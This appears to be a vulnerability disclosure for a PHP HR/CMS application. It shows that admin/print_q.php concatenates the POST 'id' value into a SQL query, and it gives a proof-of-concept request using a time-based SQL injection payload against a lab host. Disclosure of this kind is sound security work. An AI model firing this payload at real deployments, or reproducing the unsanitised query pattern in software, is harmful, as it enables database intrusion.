### Vulnerability file address

`admin/print_q.php` from line 19,The `$_POST['id']` parameter is controllable and the `$_POST['id']` is not protected from sql injection, line 22 `$statement = $conn->prepare($sql);` ,line 23 `$statement->execute();`,line 23 performs a SQL query, causing SQL injection

```php
<?php
error_reporting(0);
require_once('../assets/constants/config.php');
require_once('../assets/constants/check-login.php');
require_once('../assets/constants/fetch-my-info.php');

?>

<?php


$stmt = $conn->prepare("SELECT * FROM admin WHERE id='" . $_SESSION['id'] . "'");
$stmt->execute();
$result = $stmt->fetch(PDO::FETCH_ASSOC);

?>

<?php
$sql = "SELECT * FROM tbl_quoatation where  id='" . $_POST['id'] . "'";


$statement = $conn->prepare($sql);
$statement->execute();
$invoice = $statement->fetch(PDO::FETCH_ASSOC);
```

### POC

```http
POST /CMS/php/_hr_soft/admin/print_q.php HTTP/1.1
Host: 10.0.0.20:82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

id=1000';SELECT SLEEP(5)#
```

### Attack results pictures

![image-20250130161319170](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501301613212.png)